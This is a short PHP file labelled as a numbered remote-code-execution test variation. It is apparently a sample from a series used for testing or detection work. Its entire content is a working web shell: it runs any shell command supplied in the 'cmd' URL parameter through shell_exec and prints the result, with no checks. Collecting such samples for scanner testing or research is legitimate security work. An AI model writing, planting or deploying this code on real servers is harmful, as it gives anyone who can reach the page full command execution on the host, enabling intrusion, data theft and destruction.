<?php
// RCE test variation #192
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>